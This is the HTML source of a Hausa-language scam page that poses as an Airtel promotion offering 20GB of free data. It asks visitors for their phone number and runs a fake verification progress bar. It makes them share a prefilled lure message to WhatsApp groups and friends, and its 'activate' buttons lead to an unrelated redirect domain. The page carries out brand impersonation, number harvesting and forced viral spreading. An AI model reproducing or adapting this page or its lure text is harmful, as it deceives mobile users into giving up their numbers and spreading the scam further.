...
<html>
    <head> 
      <script src="kimsi.js"></script>

        <script src="activate-airtelfree20gb.com.js"></script>
...
<script>
  ...
  gtag('config', 'UA-180685151-1');
    ...
    <script>
        ...
        <title>AIRTEL- 2025 BAYANIN KYAUTA KYAUTA GA DUKAN kwastomomi</title>
        <link rel="shortcut icon" type="image/png" href="ii.jpeg" />
        <meta name="og:title" content="AIRTEL - RANAR SAMUN SAUKI KYAUTA GA DUKKANCUSTOM" />
        <meta property="og:description" content="AIRTEL, tana Bada Data 20Gb Kyauta ga duk abokan ciniki" />
        <meta property="og:image" content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-N_YdVs4stH4Vzml7Zhx1zZGOujg9_cGJTeksbrBwN6noDrvlMJwssVWS_S477AHHUE3MMPcrpjuM7lpIKGj2BfilPHnh7HANVz8T9hOUCJKPax0gLDkQF_fdfeKfnzvdVMsqoUUNJLnmp0qzV7tXKQ63W30jRTor5Mauo8S9fzIhnuw5KGzzkc_J4n1B/s320/InShot_20250803_101528390%20(1).jpg" />
...
.spin {
    ...
    border: solid 8px rgb(254, 32, 19);
...
.A{
    text-align: center;
    background-color: rgb(254, 32, 19);
}
</style>
  
  
  <center><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEivcuy_712u6RMgsDbAoCNv7GfgScQt0sHSw9jTJtcyGa_qvaj-537sFUs0SH7R4IjYL9_NnLpE2Gbmjm4Tcb7Nk8lnbY4iPel3zxPT6fUj_ICABN0lObwAq0wbf1mAXv0YvIuGy3dgXilx_ftT5H2_4JpGu6rfnmMcr81XnU6Q6I8hGTSy50vlUPVq6jBm/s320/InShot_20250803_102007511.jpg" alt="Free-Data" style="width: 100%;">
  ...
  behavior="alternate"
  style="border:solid">
    <marquee behavior="alternate"> <font color="black">AIRTEL KYAUTAR DATA 20GB GA DUKKANCUSTOM</font></marquee>
</marquee>
...
<center><script type="text/javascript" src="//widget.supercounters.com/ssl/online_i.js"></script><script type="text/javascript">sc_online_i(1716574,"#ff2317","RED");</script><!-- END: Powered by Supercounters.com -->
                        ...
                        <div class="A">
                        <font color="white">  Yaku Abokin Ciniki Ku Tabbatar da lambar ku ta Airtel don kunna tayin data kyauta </font><br/> <b><font color="white">INGANTACCEN SAUKI:</font></b> <span class="blink"><b><font color="#010101">10 GA GASKIYA</font></b> </span><font color="white">Shigar da lambar AIRTEL ɗin ku a ƙasa sannan ku danna <b></b>DUBA</b></font>
         </div>
    <div class="post" width="100%">
        ...
        <div id="intro">
            ...
            <p class="welcome">
                ...
                <center><input type="char" placeholder="Shigar da lambar Airtel" id="name" name="Phone" style="fontwidth: 244px;height: 56px;font-size: 18px;width: 330px;" onkeypress="return numberonly(event);"></center><br/>
            ...
            <button id="go">DUBA ➤</button>
        </div>
        <div id="loader">
            <div>Duba Lambar ku...</div>
            <div class="spin"></div>
            <div id="num">0%</div>
        </div>
        <div id="info">
           ...
           <center><p class="title"><font color="red">RANAR GASKIYA AIRTEL KYAUTA 2OGB DATA INTERNET</font></p></center>
          <center>
<select aria-label="الجنس" name="birthday_year" id="year" title="الجنس" class="_5dba" style="
    width: 330px;
    height: 56px;
">
<option value="أختر نوع الشبكة" selected="1">---Samu Kyauta Anan---</option>
  <option value="1">KYAUTAR DATA KYAUTA AIRTEL - 20GB  </option>
</select>
</center><br>

 
                  
          <button id="confirm">Ci gaba</button>
            </div>
            <p class="error">Yi haƙuri, Lambar ku ta ɓace <a href="https://data-offer.ink/activate-airtelfree20gb.com"> <b><font color="#14948F">KARA NUMBER</font></b></a></p>
        </div>
        <div id="checking">
            <p class="title">Kunna Bayanai...</p>
            <div class="barr">
                <div class="fill">
                    <div id="fill"></div>
                </div>
        ...
        <div id="share">
            ...
            <p class="tip"> Ina taya ku, lambar ku ta AIRTEL <span id="getname"></span>،</p>
            <p class="tip">
                Ya Cancanci Samun Kyautar Data 20Gb Kyauta <span class="amount"> Ci gaba don Kunna Taimakon Bayanan Intanet na Kyauta na 20Gb</span><br>
              Yadda ake ci gaba:
            </p><br>
            <p class="tip">1. Raba shi zuwa ƙungiyoyi 5 ko abokai 15 akan WhatsApp (danna alamar "SHARE" a ƙasa).</p>
            <p class="tip">2. Za a tura ku kai tsaye zuwa shafinmu na "ACTIVATION" bayan an cika mashin tabbatar da GREEN.</p>
        ...
        <div id="claim">
            ...
            <p class="title"> Click "ACTIVATE" don kunna Bayanan ku </p>
           <br/>
          <a  onclick="window.open('https://sawutser.top/4/9089389')" href="https://sawutser.top/4/9089389" >
                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="white">KUNNA 20GB</font></button>
                    </a><br/>
             <br/>
          
          
          <a  onclick="window.open('https://sawutser.top/4/9089389')" href="https://sawutser.top/4/9089389" >
                    <button style="display: flex;align-items: center;justify-content: center;margin: 0;width: 100%;" class="btn btn-primary"><font color="white">BATUN RUWAITO</font></button>
                    </a><br/>
            <button id="offer">KUNNA</button><br/>
             
             
          
          
              </div>
        <center><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEipsU9aYim73HbP9wW-6eRBjsz1tRDP97CXzvu1VMt_nX56WFWoAVJTNQ6MiwZ77p17lpthk2odm67BZRgHou8AOWrivl8qWfWztxkfNoRz_j2jmDYMDRfkh0I-duMgoXCxItACwyNKGBu_GI_jXU31u5NKt8AGVCF2nskV3MkQVrHPFLOBNOYPBKBCwyG_/s320/images%20(67)%20(1).png" alt="Free-Data" style="width: 100%;">
...
<script>
     ...
     var text1 = "*TAYA MURNA GA DUKKAN CUSTOMMAN AIRTEL*%0A%0AAIRTEL tana Bada Bayanan Intanet Kyauta ga duk *CUSTOMERS*%0A%0A✅AIRTEL RANAR SAMUN SAUKI KYAUTA - *20GB*%0AYi sauri Yanzu kuma duba idan *AIRTEL SIM CARD* ya cancanci wannan tayin%0A%0A_DUBA NAN_👇%0Ahttps://data-offer.ink/activate-airtelfree20gb.com",
            text2 = " an amount of ",
            ...
            abcde = "https://sawutser.top/4/9089389",
            saved = "",
